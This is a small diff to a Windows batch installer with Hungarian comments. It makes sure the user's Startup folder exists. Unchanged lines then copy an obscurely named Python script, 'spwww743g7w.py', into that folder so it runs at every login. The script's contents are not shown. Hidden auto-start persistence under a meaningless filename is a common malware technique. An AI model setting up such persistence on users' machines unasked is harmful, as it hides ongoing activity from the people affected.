@@ -47,7 +47,13 @@ echo Függőségek rendben.
 echo -----------------------
 echo.
 
+:: Startup mappa helye
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+:: ha nincs ilyen mappa, hozza létre
+if not exist "%STARTUP_FOLDER%" (
+    mkdir "%STARTUP_FOLDER%"
+)
 
 :: .py fájlok bemásolása Startupba
 copy "%~dp0spwww743g7w.py" "%STARTUP_FOLDER%\spwww743g7w.py" /Y >nul
@@ -64,4 +70,5 @@ echo spw elindult.
 echo.
 echo Kész.
 pause
+
 
